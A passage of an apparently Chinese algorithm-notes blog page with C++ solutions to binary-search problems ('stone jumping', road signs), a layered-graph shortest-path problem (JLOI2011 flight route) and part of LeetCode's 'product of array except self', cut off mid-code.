id="个人理解">个人理解</h2><p><strong>如果题目出现了“最大值最小”、“最小值最大”、“第一个大于等于该数的值”（有序）、“最后一个小于等于该数的值”（有序）的情况下就可以考虑使用二分</strong></p><p>二分模板1：（求第一个大于等于该数的值、最大值最小问题）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(left&lt;right)&#123;<br><span class="hljs-type">int</span> mid = (left + right) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid)) right = mid;<br><span class="hljs-keyword">else</span> left = mid + <span class="hljs-number">1</span>;<br>&#125;<br>cout&lt;&lt;left&lt;&lt;endl;<br></code></pre></td></tr></table></figure><p>二分模板2：（求最后一个小于等于该数的值、最小值最大问题）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span>(left &lt; right)&#123;<br><span class="hljs-type">int</span> mid = (left + right + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid)) left = mid;<br><span class="hljs-keyword">else</span> right = mid - <span class="hljs-number">1</span>;<br>&#125;<br>cout&lt;&lt;right&lt;&lt;endl;<br></code></pre></td></tr></table></figure><h2 id="跳石头">1. 跳石头</h2><h3 id="题目描述-2">题目描述</h3><p>一年一度的“跳石头”比赛又要开始了！</p><p>这项比赛将在一条笔直的河道中进行，河道中分布着一些巨大岩石。组委会已经选择好了两块岩石作为比赛起点和终点。在起点和终点之间，有<span class="math inline">\(N\)</span>块岩石（不含起点和终点的岩石）。在比赛过程中，选手们将从起点出发，每一步跳向相邻的岩石，直至到达终点。</p><p>为了提高比赛难度，组委会计划移走一些岩石，使得选手们在比赛过程中的最短跳跃距离尽可能长。由于预算限制，组委会至多从起点和终点之间移走<span class="math inline">\(M\)</span>块岩石（不能移走起点和终点的岩石）。</p><h3 id="输入格式-4">输入格式</h3><p>第一行包含三个整数 <spanclass="math inline">\(L,N,M\)</span>，分别表示起点到终点的距离，起点和终点之间的岩石数，以及组委会至多移走的岩石数。保证<span class="math inline">\(L \geq 1\)</span> 且 <spanclass="math inline">\(N \geq M \geq 0\)</span>。</p><p>接下来 <span class="math inline">\(N\)</span> 行，每行一个整数，第<span class="math inline">\(i\)</span> 行的整数 <spanclass="math inline">\(D_i\,( 0 &lt; D_i &lt; L)\)</span>， 表示第 <spanclass="math inline">\(i\)</span>块岩石与起点的距离。这些岩石按与起点距离从小到大的顺序给出，且不会有两个岩石出现在同一个位置。</p><h3 id="输出格式-4">输出格式</h3><p>一个整数，即最短跳跃距离的最大值。</p><h3 id="样例-2">样例</h3><h4 id="样例输入-2">样例输入</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">25 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <br><span class="hljs-number">2</span><br><span class="hljs-number">11</span><br><span class="hljs-number">14</span><br><span class="hljs-symbol">17 </span><br><span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><h4 id="样例输出-2">样例输出</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">4<br></code></pre></td></tr></table></figure><h3 id="提示">提示</h3><h4 id="输入输出样例说明">输入输出样例说明</h4><p>将与起点距离为 <span class="math inline">\(2\)</span> 和 <spanclass="math inline">\(14\)</span> 的两个岩石移走后，最短的跳跃距离为<span class="math inline">\(4\)</span>（从与起点距离 <spanclass="math inline">\(17\)</span> 的岩石跳到距离 <spanclass="math inline">\(21\)</span> 的岩石，或者从距离 <spanclass="math inline">\(21\)</span> 的岩石跳到终点）。</p><h4 id="数据规模与约定">数据规模与约定</h4><p>对于 <span class="math inline">\(20\%\)</span>的数据，<spanclass="math inline">\(0 \le M \le N \le 10\)</span>。<br />对于 <span class="math inline">\(50\%\)</span> 的数据，<spanclass="math inline">\(0 \le M \le N \le 100\)</span>。<br />对于 <span class="math inline">\(100\%\)</span> 的数据，<spanclass="math inline">\(0 \le M \le N \le 50000,1 \le L\le 10^9\)</span>。</p><h3 id="分析-1">分析</h3><p>如果直接去想做法会很困难，我们可以换一种思路去想。我们二分给定一个最小间隔距离，然后扫描一遍石头序列，如果不满足最小间隔就将该石头删去。</p><p>二分判断依据：如果删除的个数大于最多要求的个数，说明间隔大了，需要缩小范围right=mid。如果删除个数小于等于最多个数，那么我们可以尝试继续变大间隔，left=mid+1；直到二分结束</p><h3 id="代码-4">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> num[N];<br><span class="hljs-type">int</span> d,n,k;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;d&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-type">int</span> cur = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++)  cin&gt;&gt;num[i];<br>    num[n] = d;<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>,right = <span class="hljs-number">1e9</span>;<br>    <span class="hljs-keyword">while</span>(left&lt;right)&#123;<br>        <span class="hljs-type">int</span> mid = (left + right + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>,cur = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;=n;i++)&#123;<br>            <span class="hljs-keyword">if</span>(num[i] - cur &lt; mid) cnt++;<br>            <span class="hljs-keyword">else</span> cur = num[i];<br>        &#125;<br>        <span class="hljs-keyword">if</span>(cnt &lt;= k) left = mid;<br>        <span class="hljs-keyword">else</span> right = mid - <span class="hljs-number">1</span>;<br>    &#125;<br>    cout&lt;&lt;left&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="路标设置">2. 路标设置</h2><h3 id="题目背景">题目背景</h3><p>B 市和 T市之间有一条长长的高速公路，这条公路的某些地方设有路标，但是大家都感觉路标设得太少了，相邻两个路标之间往往隔着相当长的一段距离。为了便于研究这个问题，我们把公路上相邻路标的最大距离定义为该公路的“空旷指数”。</p><h3 id="题目描述-3">题目描述</h3><p>现在政府决定在公路上增设一些路标，使得公路的“空旷指数”最小。他们请求你设计一个程序计算能达到的最小值是多少。请注意，公路的起点和终点保证已设有路标，公路的长度为整数，并且原有路标和新设路标都必须距起点整数个单位距离。</p><h3 id="输入格式-5">输入格式</h3><p>第 <span class="math inline">\(1\)</span> 行包括三个数 <spanclass="math inline">\(L,N,K\)</span>，分别表示公路的长度，原有路标的数量，以及最多可增设的路标数量。</p><p>第 <span class="math inline">\(2\)</span> 行包括递增排列的 <spanclass="math inline">\(N\)</span> 个整数，分别表示原有的 <spanclass="math inline">\(N\)</span>个路标的位置。路标的位置用距起点的距离表示，且一定位于区间 <spanclass="math inline">\([0,L]\)</span> 内。</p><h3 id="输出格式-5">输出格式</h3><p>输出 <span class="math inline">\(1\)</span>行，包含一个整数，表示增设路标后能达到的最小“空旷指数”值。</p><h3 id="样例-3">样例</h3><h4 id="样例输入-3">样例输入</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">101 </span><span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">101</span><br></code></pre></td></tr></table></figure><h4 id="样例输出-3">样例输出</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">51<br></code></pre></td></tr></table></figure><h4 id="提示-1">提示</h4><p>公路原来只在起点和终点处有两个路标，现在允许新增一个路标，应该把新路标设在距起点<span class="math inline">\(50\)</span> 或 <spanclass="math inline">\(51\)</span> 个单位距离处，这样能达到最小的空旷指数<span class="math inline">\(51\)</span>。</p><p><span class="math inline">\(50\%\)</span> 的数据中，<spanclass="math inline">\(2 \leq N \leq 100\)</span>，<spanclass="math inline">\(0 \leq K \leq 100\)</span>。</p><p><span class="math inline">\(100\%\)</span> 的数据中，<spanclass="math inline">\(2 \leq N \leq 100000\)</span>, <spanclass="math inline">\(0 \leq K \leq100000\)</span>。</p><p><span class="math inline">\(100\%\)</span> 的数据中，<spanclass="math inline">\(0 &lt; L \leq 10000000\)</span>。</p><h3 id="分析-2">分析</h3><p>这道题思想和前面比较类似，我们可以用二分来寻找答案。我们设置一个间隔，当设置这个间隔所要插入的路标数大于最大插入数时，说明我们间隔小了，当小于等于最大插入数时，我们可以继续尝试缩小间隔。<strong>这题难点在于如何计算需要插入的数</strong></p><h3 id="代码-5">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> l,n,k;<br><span class="hljs-type">int</span> num[N];<br><span class="hljs-comment">// 这部分是难点</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> mid)</span></span>&#123;<br>    <span class="hljs-type">int</span> cnt = k,cur = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(cnt &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(num[i] - cur &lt;= mid) cur = num[i];<br>        <span class="hljs-keyword">else</span>&#123;<br>            cur += mid;<br>            i --;<br>            cnt --;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(cnt &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">// </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;l&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;num[i];<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>,right = l;<br>    <span class="hljs-type">int</span> ans ;<br>    <span class="hljs-keyword">while</span>(left&lt;=right)&#123;<br>        <span class="hljs-type">int</span> mid = left + (right - left) / <span class="hljs-number">2</span> ;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid))&#123;<br>            ans = mid;<br>            right = mid - <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> left = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="分层最短路算法">分层最短路算法</h1><h2 id="定义-1">定义</h2><p>分层图最短路是指在可以进行分层图的图上解决最短路问题。分层图：可以理解为有多个平行的图。</p><p>一般模型是：在一个正常的图上可以进行 k次决策，对于每次决策，不影响图的结构，只影响目前的状态或代价。一般将决策前的状态和决策后的状态之间连接一条权值为决策代价的边，表示付出该代价后就可以转换状态了。</p><p><strong>一般有两种方法解决分层图最短路问题：</strong></p><ol type="1"><li><strong>建图时直接建成k+1层。</strong></li><li><strong>多开一维记录机会信息。</strong></li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">第一种方法<br></code></pre></td></tr></table></figure><p>我们建<spanclass="math inline">\(k+1\)</span>层图。然后有边的两个点，多建一条到下一层边权为0的单向边，如果走了这条边就表示用了一次机会。</p><p>有N个点时，<span class="math inline">\(1-n\)</span>表示第一层，<spanclass="math inline">\((1+n)-(n+n)\)</span>代表第三层<spanclass="math inline">\(,(1+2*n)-(n+2*n)\)</span>代表第三层。因为要建K+1层图，数组要开到<spanclass="math inline">\(n*(k+1)\)</span>，点的个数也为<spanclass="math inline">\(n*(k+1)\)</span> 。</p><p><strong>n = 4，m = 3， k = 2</strong></p><p><strong>0 1 100</strong></p><p><strong>1 2 100</strong></p><p><strong>2 3 100</strong></p><p><strong>建成图之后大概是这样的：</strong></p><figure><imgsrc="https://img-blog.csdnimg.cn/20190119123546193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1Z2FyYmxpc3M=,size_16,color_FFFFFF,t_70"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="jloi2011-飞行路线">[JLOI2011] 飞行路线</h2><h3 id="题目描述-4">题目描述</h3><p>Alice 和 Bob现在要乘飞机旅行，他们选择了一家相对便宜的航空公司。该航空公司一共在<span class="math inline">\(n\)</span>个城市设有业务，设这些城市分别标记为 <spanclass="math inline">\(0\)</span> 到 <spanclass="math inline">\(n-1\)</span>，一共有 <spanclass="math inline">\(m\)</span>种航线，每种航线连接两个城市，并且航线有一定的价格。</p><p>Alice 和 Bob现在要从一个城市沿着航线到达另一个城市，途中可以进行转机。航空公司对他们这次旅行也推出优惠，他们可以免费在最多<span class="math inline">\(k\)</span> 种航线上搭乘飞机。那么 Alice 和Bob 这次出行最少花费多少？</p><h3 id="输入格式-6">输入格式</h3><p>第一行三个整数 <spanclass="math inline">\(n,m,k\)</span>，分别表示城市数，航线数和免费乘坐次数。</p><p>接下来一行两个整数 <spanclass="math inline">\(s,t\)</span>，分别表示他们出行的起点城市编号和终点城市编号。</p><p>接下来 <span class="math inline">\(m\)</span> 行，每行三个整数 <spanclass="math inline">\(a,b,c\)</span>，表示存在一种航线，能从城市 <spanclass="math inline">\(a\)</span> 到达城市 <spanclass="math inline">\(b\)</span>，或从城市 <spanclass="math inline">\(b\)</span> 到达城市 <spanclass="math inline">\(a\)</span>，价格为 <spanclass="math inline">\(c\)</span>。</p><h3 id="输出格式-6">输出格式</h3><p>输出一行一个整数，为最少花费。</p><h3 id="样例-1-1">样例 #1</h3><h3 id="样例输入-1-1">样例输入 #1</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">6</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">4</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> <span class="hljs-number">5</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">5</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">5</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">4</span> <span class="hljs-number">5</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">2</span> <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><h3 id="样例输出-1-1">样例输出 #1</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">8<br></code></pre></td></tr></table></figure><h3 id="数据规模与约定-1">数据规模与约定</h3><p>对于 <span class="math inline">\(30\%\)</span> 的数据，<spanclass="math inline">\(2 \le n \le 50\)</span>，<spanclass="math inline">\(1 \le m \le 300\)</span>，<spanclass="math inline">\(k=0\)</span>。</p><p>对于 <span class="math inline">\(50\%\)</span> 的数据，<spanclass="math inline">\(2 \le n \le 600\)</span>，<spanclass="math inline">\(1 \le m \le 6\times10^3\)</span>，<spanclass="math inline">\(0 \le k \le 1\)</span>。</p><p>对于 <span class="math inline">\(100\%\)</span> 的数据，<spanclass="math inline">\(2 \le n \le 10^4\)</span>，<spanclass="math inline">\(1 \le m \le 5\times 10^4\)</span>，<spanclass="math inline">\(0 \le k \le 10\)</span>，<spanclass="math inline">\(0\le s,t,a,b &lt; n\)</span>，<spanclass="math inline">\(a\ne b\)</span>，<span class="math inline">\(0\lec\le 10^3\)</span>。</p><p>另外存在一组 hack 数据。</p><h3 id="方法">方法</h3><p>运用分层最短路算法，同层之间保持正常的距离图，从上层到下一层之间的距离为0<strong>（下层不能到上层）</strong>，上层到下层代表着使用一次免费中转的机会。有k次免费中转的机会，所以要设置k+1层距离图。</p><h3 id="代码-6">代码</h3><p>代码中最后求答案的时候要注意，<strong>我们在计算最小值的时候有可能没有把所有每次免费中转的机会都用完，所以要遍历每层中的终点值的解。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">5e4</span>*<span class="hljs-number">42</span>;<br><span class="hljs-type">int</span> head[N],val[N],ne[N],w[N],dis[N],idx;<br><span class="hljs-type">bool</span> state[N];<br><span class="hljs-type">int</span> n,m,k,s,t;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c)</span></span>&#123;<br>    ne[idx] = head[a];<br>    val[idx] = b;<br>    w[idx] = c;<br>    head[a] = idx++;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m&gt;&gt;k&gt;&gt;s&gt;&gt;t;<br>    <span class="hljs-built_in">memset</span>(head,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> head);<br>    <span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dis);<br>    <span class="hljs-keyword">while</span>(m--)&#123;<br>        <span class="hljs-type">int</span> a,b,c;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>        <span class="hljs-built_in">add</span>(a,b,c);<br>        <span class="hljs-built_in">add</span>(b,a,c);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;k;i++)&#123;<br>            <span class="hljs-built_in">add</span>(a+i*n,b+(i+<span class="hljs-number">1</span>)*n,<span class="hljs-number">0</span>);<br>            <span class="hljs-built_in">add</span>(b+i*n,a+(i+<span class="hljs-number">1</span>)*n,<span class="hljs-number">0</span>);<br>            <span class="hljs-built_in">add</span>(a+(i+<span class="hljs-number">1</span>)*n,b+(i+<span class="hljs-number">1</span>)*n,c);<br>            <span class="hljs-built_in">add</span>(b+(i+<span class="hljs-number">1</span>)*n,a+(i+<span class="hljs-number">1</span>)*n,c);<br>        &#125;<br>    &#125;<br>    dis[s] = <span class="hljs-number">0</span>;<br>    priority_queue&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;,vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;,greater&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;&gt; q;<br>    q.<span class="hljs-built_in">push</span>(&#123;<span class="hljs-number">0</span>,s&#125;);<br>    <span class="hljs-keyword">while</span>(q.<span class="hljs-built_in">size</span>())&#123;<br>        <span class="hljs-keyword">auto</span> t = q.<span class="hljs-built_in">top</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">if</span>(state[t.second]) <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-type">int</span> d = t.first;<br>        <span class="hljs-type">int</span> node = t.second;<br>        state[node] = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = head[node];i!=<span class="hljs-number">-1</span>;i=ne[i])&#123;<br>            <span class="hljs-type">int</span> j = val[i];<br>            <span class="hljs-keyword">if</span>(d + w[i] &lt; dis[j] &amp;&amp; !state[j])&#123;<br>                dis[j] = d + w[i];<br>                q.<span class="hljs-built_in">push</span>(&#123;dis[j],j&#125;);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> ans = dis[t];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=k;i++) ans = <span class="hljs-built_in">min</span>(ans,dis[t + k * n]);<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="leetcode-除自身以外数组的乘积">Leetcode除自身以外数组的乘积</h1><h2 id="题目描述-5">题目描述</h2><p>给你一个整数数组 <code>nums</code>，返回 <em>数组 <code>answer</code>，其中 <code>answer[i]</code> 等于 <code>nums</code> 中除<code>nums[i]</code> 之外其余各元素的乘积</em> 。</p><p>题目数据 <strong>保证</strong> 数组<code>nums</code>之中任意元素的全部前缀元素和后缀的乘积都在 <strong>32位</strong> 整数范围内。</p><p>请 <strong>不要使用除法，</strong>且在 <code>O(*n*)</code>时间复杂度内完成此题。</p><p>## 输入输出</p><p><strong>示例 1:</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">输入: nums = [<span class="hljs-number">1,2,3,4</span>]<br>输出: [<span class="hljs-number">24,12,8,6</span>]<br></code></pre></td></tr></table></figure><p><strong>示例 2:</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">输入: nums = <span class="hljs-comment">[-1,1,0,-3,3]</span><br>输出: <span class="hljs-comment">[0,0,9,0,0]</span><br></code></pre></td></tr></table></figure><h2 id="提示-2">提示</h2><ul><li><code>2 &lt;= nums.length &lt;= 105</code></li><li><code>-30 &lt;= nums[i] &lt;= 30</code></li><li><strong>保证</strong> 数组<code>nums</code>之中任意元素的全部前缀元素和后缀的乘积都在 <strong>32位</strong> 整数范围内</li></ul><h2 id="解题思路">解题思路</h2><figure><img src="https://pic.leetcode-cn.com/1624619180-vpyyqh-Picture1.png"alt="解题思路" /><figcaption aria-hidden="true">解题思路</figcaption></figure><h2 id="代码编写">代码编写</h2><p>最朴素做法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> nums[N],n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;nums[i];<br>    <span class="hljs-type">int</span> a[N],b[N],c[N];<br>    b[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    a[n<span class="hljs-number">-1</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;n;i++) b[i] = b[i<span class="hljs-number">-1</span>] * nums[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = n<span 